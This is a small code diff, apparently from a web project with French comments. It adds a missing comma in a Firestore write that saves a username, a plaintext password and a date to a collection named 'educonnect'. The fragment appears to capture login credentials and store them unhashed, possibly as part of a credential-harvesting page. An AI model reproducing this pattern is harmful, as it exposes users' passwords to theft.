@@ -379,7 +379,7 @@
                 // Enregistrer les données dans Firestore
                 await addDoc(collection(db, "educonnect"), {
                     ID: username,
-                    MDP: password
+                    MDP: password,
                     Date: new Date()
                 });
 
